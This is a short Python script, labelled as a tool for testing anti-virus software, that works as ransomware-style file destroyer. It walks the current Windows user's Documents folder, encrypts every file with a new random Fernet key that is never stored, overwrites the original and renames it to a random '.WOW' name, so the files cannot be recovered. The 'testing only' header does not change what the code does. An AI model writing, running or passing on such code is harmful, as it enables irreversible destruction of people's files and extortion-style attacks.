# Created by @TheCcortex | Under MIT License #
# IMPORTANT: JUST USE THIS FOR TESTING ANTI-VIRUS SOFTWARE """ONLY""" | NOT FOR H@CKING AND R@NSOM #
# Please note: Although that this is for testing purposes, It may create critical problems or file loss#
# SO PLEASE USE THIS PYTHON SCRIPT WITH A LOT OF CARE #

import os
import cryptography.fernet as cf
import random
import string

try:
    letters = string.ascii_lowercase
    usr = os.getlogin()
    for r,d, files in os.walk("C:\\Users\\"+usr+"\\Documents"):
        for file in files:
            ran_name = ''.join(random.choice(letters) for i in range(10))
            lfile = os.path.join(r, file)
            lname = os.path.join(r, ran_name + ".WOW")
            if not "desktop.ini" in lfile:
                key = cf.Fernet.generate_key()
                fernet = cf.Fernet(key)
                with open(lfile, 'rb') as file:
                    original = file.read()
                encrypted = fernet.encrypt(original)
                with open(lfile, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)
                os.rename(lfile, lname)
except PermissionError:
    pass
